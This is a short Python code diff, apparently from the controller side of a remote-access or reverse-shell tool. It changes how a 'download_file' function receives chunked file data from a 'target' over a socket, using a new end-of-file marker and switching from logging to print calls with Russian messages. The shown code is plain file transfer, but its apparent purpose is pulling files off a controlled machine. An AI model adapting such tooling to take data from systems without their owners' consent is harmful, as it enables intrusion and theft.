@@ -58,14 +58,15 @@ def download_file(command, target):
     try:
         with open(file_name, "wb") as file:
             while True:
-                chunk = target.recv(1024)
-                if chunk.endswith(b"EOF"):  
-                    file.write(chunk[:-3])  
+                chunk = target.recv(1024)  
+                if b"EOFEOFEOF" in chunk:  
+                    file.write(chunk.replace(b"EOFEOFEOF", b""))  
                     break
-                file.write(chunk)  
-        logging.info(f"[+] Файл {file_name} успешно загружен и сохранен.")
+                file.write(chunk) 
+        print(f"[+] Файл {file_name} успешно загружен.")
     except Exception as e:
-        logging.error(f"[!!] Ошибка при загрузке файла {file_name}: {e}")
+        print(f"[!!] Ошибка при загрузке файла {file_name}: {e}")
+
 
 
 def upload_file(command, target):
